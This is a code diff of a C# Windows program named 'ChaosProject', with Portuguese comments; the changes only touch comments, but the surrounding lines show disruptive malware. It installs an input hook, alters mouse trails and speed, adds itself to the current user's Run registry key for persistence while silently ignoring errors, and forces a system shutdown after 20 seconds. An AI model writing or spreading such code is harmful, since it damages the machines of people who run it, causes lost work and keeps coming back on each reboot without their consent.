@@ -12,7 +12,7 @@ namespace ChaosProject
 {
     static class Program
     {
-        // --- APIS DO WINDOWS ---
+        // --- APIS WINDOWS ---
         [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
         public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
 
@@ -57,17 +57,17 @@ namespace ChaosProject
         {
             _hookID = SetHook(_proc);
 
-            // --- CONFIGURAÇÃO DO MOUSE ---
+            // --- CONFIG DO MOUSEE ---
             SystemParametersInfo(SPI_SETMOUSETRAILS, 10, 0, 0);
             SystemParametersInfo(SPI_SETMOUSESPEED, 0, 20, 0);
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
-            // PERSISTÊNCIA
+            // PERSISTÊNCIA SRSR
             try { Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("Projeto001", Application.ExecutablePath); } catch { }
 
-            // --- NOVO TEMPORIZADOR: DESLIGAMENTO FORÇADO EM 20 SEGUNDOS ---
+            // --- NOVO TEMPORIZADOR: DESLIGAMENTO FORÇADO EM 20 SEGUNDOS EM MILESSIMOS DE SEGUNDOS---
             Task.Run(async () => {
                 await Task.Delay(20000); // Espera 20 segundos
                 ProcessStartInfo psi = new ProcessStartInfo("shutdown", "/s /f /t 0")
@@ -249,4 +249,5 @@ namespace ChaosProject
             Application.Run(n);
         }
     }
+
 }
